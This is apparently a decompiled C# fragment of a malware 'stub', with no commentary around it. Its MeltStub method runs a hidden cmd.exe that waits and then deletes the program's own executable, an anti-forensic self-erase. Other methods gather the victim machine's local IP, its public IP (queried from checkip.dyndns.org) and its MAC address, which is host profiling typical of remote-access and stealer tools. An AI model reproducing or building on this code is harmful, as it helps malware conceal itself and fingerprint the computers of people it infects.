using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;

namespace Stub
{
	// Token: 0x0200002D RID: 45
	public static class Smalls
	{
		// Token: 0x06000087 RID: 135 RVA: 0x00006FBC File Offset: 0x000051BC
		public static void MeltStub()
		{
			try
			{
				string location = Assembly.GetEntryAssembly().Location;
				Process.Start(new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + location + "\"")
				{
					WindowStyle = ProcessWindowStyle.Hidden
				}).Dispose();
				Environment.Exit(0);
			}
			catch
			{
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x0000701C File Offset: 0x0000521C
		public static string GetLocalIPAddress()
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ipaddress in hostEntry.AddressList)
			{
				if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return ipaddress.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00007070 File Offset: 0x00005270
		public static string GetIPAddress()
		{
			string text = "";
			WebRequest webRequest = WebRequest.Create("http://checkip.dyndns.org/");
			using (WebResponse response = webRequest.GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
				{
					text = streamReader.ReadToEnd();
				}
			}
			int num = text.IndexOf("Address: ") + 9;
			int num2 = text.LastIndexOf("</body>");
			text = text.Substring(num, num2 - num);
			return text;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00007108 File Offset: 0x00005308
		public static string GetMacAddress()
		{
			string text = string.Empty;
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					break;
				}
			}
			return text;
		}
	}
}
